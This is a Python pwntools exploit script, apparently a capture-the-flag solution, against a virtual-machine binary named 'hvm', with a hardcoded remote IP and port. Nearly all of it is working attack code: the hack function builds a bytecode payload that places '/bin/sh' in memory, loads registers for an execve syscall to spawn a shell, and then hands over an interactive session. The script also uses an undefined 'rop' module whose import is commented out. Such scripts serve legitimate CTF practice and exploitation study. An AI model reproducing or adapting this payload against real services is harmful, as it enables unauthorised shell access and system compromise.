from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./hvm"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0xcba+0x555555554000\n')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def hack():
	raw_input()
	payload = '/bin/sh\0'
	payload = payload.ljust(0x30,'\x00')
	payload += p32(0x00400000) + p32(0xfdfbffff) + p32(0)*2
	payload += p32(0xf) + p32(0x38000000)
	payload += p32(13)	#write sh_addr to 2020b0  --> rdi
	payload += p32(4) + p32(0)  #2020c8 --> rdx
	payload += p32(1) + p32(0x3b000000)  #2020d8 --> rax
	payload += p32(26) + p32(0)  #2020f0  --> rsi
	payload += p32(0xe)
	sla('hello',payload)

	p.interactive()
hack()